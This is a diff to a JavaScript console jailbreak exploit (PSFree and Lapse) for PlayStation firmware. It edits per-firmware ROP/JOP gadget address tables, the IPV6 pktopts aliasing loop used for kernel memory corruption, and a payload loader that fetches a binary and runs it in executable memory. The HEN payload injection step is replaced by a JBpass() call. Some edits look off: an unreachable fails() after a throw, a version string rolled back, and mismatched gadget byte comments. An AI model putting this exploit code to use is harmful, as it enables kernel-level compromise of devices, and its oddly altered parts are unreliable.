@@ -99,6 +99,7 @@ class DieError extends Error {
 
 function die(msg='') {
   throw new DieError(msg);
+  fails();
 }
 
 // immutable 64-bit integer
@@ -2783,15 +2784,12 @@ function Init_LapseGlobals() {
         "pop r13; ret": 0x00000000019daaeb, // `41 5d c3`
         "pop r14; ret": 0x000000000003c986, // `41 5e c3`
         "pop r15; ret": 0x000000000024be8c, // `41 5f c3`
-      
         "ret": 0x000000000000003c, // `c3`
         "leave; ret": 0x00000000000f2c93, // `c9 c3`
-      
         "mov rax, qword ptr [rax]; ret": 0x000000000002e852, // `48 8b 00 c3`
         "mov qword ptr [rdi], rax; ret": 0x00000000000203e9, // `48 89 07 c3`
         "mov dword ptr [rdi], eax; ret": 0x0000000000020148, // `89 07 c3`
         "mov dword ptr [rax], esi; ret": 0x0000000000294dcc, // `89 30 c3`
-      
         [jop8]: 0x00000000019c2500, // `48 8b 7e 08 48 8b 07 ff 60 70`
         [jop9]: 0x00000000007776e0, // `55 48 89 e5 48 8b 07 ff 50 30`
         [jop10]: 0x0000000000f84031, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
@@ -2827,15 +2825,12 @@ function Init_LapseGlobals() {
         "pop r13; ret": 0x00000000019ccebb, // `41 5d c3`
         "pop r14; ret": 0x000000000003c826, // `41 5e c3`
         "pop r15; ret": 0x000000000024d2af, // `41 5f c3`
-      
         "ret": 0x0000000000000032, // `c3`
         "leave; ret": 0x000000000025654b, // `c9 c3`
-      
         "mov rax, qword ptr [rax]; ret": 0x000000000002e592, // `48 8b 00 c3`
         "mov qword ptr [rdi], rax; ret": 0x000000000005becb, // `48 89 07 c3`
         "mov dword ptr [rdi], eax; ret": 0x00000000000201c4, // `89 07 c3`
         "mov dword ptr [rax], esi; ret": 0x00000000002951bc, // `89 30 c3`
-      
         [jop8]: 0x00000000019b4c80, // `48 8b 7e 08 48 8b 07 ff 60 70`
         [jop9]: 0x000000000077b420, // `55 48 89 e5 48 8b 07 ff 50 30`
         [jop10]: 0x0000000000f87995, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
@@ -2871,15 +2866,12 @@ function Init_LapseGlobals() {
         "pop r13; ret": 0x00000000019a0edb, // `41 5d c3`
         "pop r14; ret": 0x000000000003bd76, // `41 5e c3`
         "pop r15; ret": 0x00000000002499df, // `41 5f c3`
-      
         "ret": 0x0000000000000032, // `c3`
         "leave; ret": 0x0000000000291fd7, // `c9 c3`
-      
         "mov rax, qword ptr [rax]; ret": 0x000000000002dc62, // `48 8b 00 c3`
         "mov qword ptr [rdi], rax; ret": 0x000000000005b1bb, // `48 89 07 c3`
         "mov dword ptr [rdi], eax; ret": 0x000000000001f864, // `89 07 c3`
         "mov dword ptr [rax], esi; ret": 0x00000000002915bc, // `89 30 c3`
-      
         [jop8]: 0x0000000001988320, // `48 8b 7e 08 48 8b 07 ff 60 70`
         [jop9]: 0x000000000076b970, // `55 48 89 e5 48 8b 07 ff 50 30`
         [jop10]: 0x0000000000f62f95, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
@@ -2914,15 +2906,12 @@ function Init_LapseGlobals() {
         "pop r13; ret": 0x00000000019a0d8b, // `41 5d c3`
         "pop r14; ret": 0x0000000000050877, // `41 5e c3`
         "pop r15; ret": 0x00000000007e2efd, // `47 5f c3`
-      
         "ret": 0x0000000000000032, // `c3`
         "leave; ret": 0x000000000001ba53, // `c9 c3`
-      
         "mov rax, qword ptr [rax]; ret": 0x000000000003734c, // `48 8b 00 c3`
         "mov qword ptr [rdi], rax; ret": 0x000000000001433b, // `48 89 07 c3`
         "mov dword ptr [rdi], eax; ret": 0x0000000000008e7f, // `89 07 c3`
         "mov dword ptr [rax], esi; ret": 0x0000000000cf6c22, // `89 30 c3`
-      
         [jop8]: 0x00000000019881d0, // `48 8b 7e 08 48 8b 07 ff 60 70`
         [jop9]: 0x00000000011c9df0, // `55 48 89 e5 48 8b 07 ff 50 30`
         [jop10]: 0x000000000126c9c5, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
@@ -2958,19 +2947,15 @@ function Init_LapseGlobals() {
         "pop r13; ret": 0x00000000001da461, // `47 5d c3`
         "pop r14; ret": 0x0000000000685d73, // `47 5e c3`
         "pop r15; ret": 0x00000000006ab3aa, // `47 5f c3`
-      
         "ret": 0x0000000000000032, // `c3`
         "leave; ret": 0x000000000008db5b, // `c9 c3`
-      
         "mov rax, qword ptr [rax]; ret": 0x00000000000241cc, // `48 8b 00 c3`
         "mov qword ptr [rdi], rax; ret": 0x000000000000613b, // `48 89 07 c3`
         "mov dword ptr [rdi], eax; ret": 0x000000000000613c, // `89 07 c3`
         "mov dword ptr [rax], esi; ret": 0x00000000005c3482, // `89 30 c3`
-      
         [jop1]: 0x00000000004e62a4,
         [jop2]: 0x00000000021fce7e,
         [jop3]: 0x00000000019becb4,
-      
         [jop4]: 0x0000000000683800,
         [jop5]: 0x0000000000303906,
         [jop6]: 0x00000000028bd332,
@@ -3004,19 +2989,15 @@ function Init_LapseGlobals() {
         "pop r13; ret": 0x00000000018fc4c1, // `47 5d c3`
         "pop r14; ret": 0x000000000028c900, // `41 5e c3`
         "pop r15; ret": 0x0000000001437c8a, // `47 5f c3`
-      
         "ret": 0x0000000000000032, // `c3`
         "leave; ret": 0x0000000000056322, // `c9 c3`
-      
         "mov rax, qword ptr [rax]; ret": 0x000000000000c671, // `48 8b 00 c3`
         "mov qword ptr [rdi], rax; ret": 0x0000000000010c07, // `48 89 07 c3`
         "mov dword ptr [rdi], eax; ret": 0x00000000000071d0, // `89 07 c3`
         "mov dword ptr [rax], esi; ret": 0x000000000007ebd8, // `89 30 c3`
-      
         [jop1]: 0x000000000060fd94, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
         [jop11]: 0x0000000002bf3741, // `5e f5 ff 60 7c`
         [jop3]: 0x000000000181e974, // `48 8b 78 08 48 8b 07 ff 60 30`
-      
         [jop4]: 0x00000000001a75a0, // `55 48 89 e5 48 8b 07 ff 50 58`
         [jop5]: 0x000000000035fc94, // `48 8b 50 18 48 8b 07 ff 50 10`
         [jop6]: 0x00000000002b7a9c, // `52 ff 20`
@@ -3793,8 +3774,7 @@ function leak_kernel_addrs(sd_pair) {
 //================================================================================================
 function make_aliased_pktopts(sds) {
   const tclass = new Word();
-  const pktopts_loopcnt = 1;
-  for (var loop = 0; loop < pktopts_loopcnt; loop++) {
+  for (var loop = 0; loop < num_alias; loop++) {
     for (var i = 0; i < num_sds; i++) {
       setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
     }
@@ -4491,7 +4471,7 @@ function array_from_address(addr, size) {
 // The flags 'PROT_READ | PROT_WRITE | PROT_EXEC' (RWX) are critical.
 // This makes the memory Readable, Writable, and EXECUTABLE.
 // This is a dangerous practice and is blocked by security measures in normal environments.
-async function PayloadLoader(Pfile) {
+async function PayloadLoader(PLfile) {
   try {
     /*
     // Fetch the payload from payload.js
@@ -4506,9 +4486,9 @@ async function PayloadLoader(Pfile) {
     paddedBuffer.set(PLD, 0);
     */
     // Fetch the payload file (e.g., payload.bin) from the server
-    const response = await fetch(Pfile);
+    const response = await fetch(PLfile);
     if (!response.ok) {
-      throw new Error(`Payload ${Pfile} file read error: ${response.status}`);
+      throw new Error(`Payload ${PLfile} file read error: ${response.status}`);
     }
     var PLD = await response.arrayBuffer(); // Read the downloaded payload as an ArrayBuffer.
     // Calculate required padding to ensure the data length is a multiple of 4 bytes.
@@ -4727,7 +4707,7 @@ function checkPlatformIsSupported() {
   var fwVersion = match[2]; // "9.00", "9.03", etc.
   // Convert "9.00" to 0x900
   config_target = parseInt(fwVersion.replace('.', ''), 16);
-  window.log("Detected FW: PS" + device + " v" + fwVersion + ", Exploit Version: v2.3\n");
+  window.log("Detected FW: PS" + device + " v" + fwVersion + ", Exploit Version: v1.5.4\n");
   // Supported FW lists
   var supportedFW = {
     "4": ["0.00",
@@ -4785,14 +4765,8 @@ async function doJailBreak() {
     jb_step_status = await doLapseExploit();
     if (jb_step_status !== 1) return;
     await sleep(500); // Wait 500ms
-    // Inject HEN payload
-    jb_step_status = await PayloadLoader("payload.bin"); // Read payload from .bin file
-    if (jb_step_status !== 1) {
-      window.log("Failed to load HEN!\nPlease restart console and try again...", "red");
-      return;
-    }
-    window.log("Homebrew Enabler loaded", "green");
-    window.log("\nPSFree & Lapse exploit with AIO fixes by ABC");
+    jb_step_status = await JBpass();
+    if (jb_step_status !== 1) return;
   }
   else {
     window.log("Kernel Exploit not implemented!", "red");
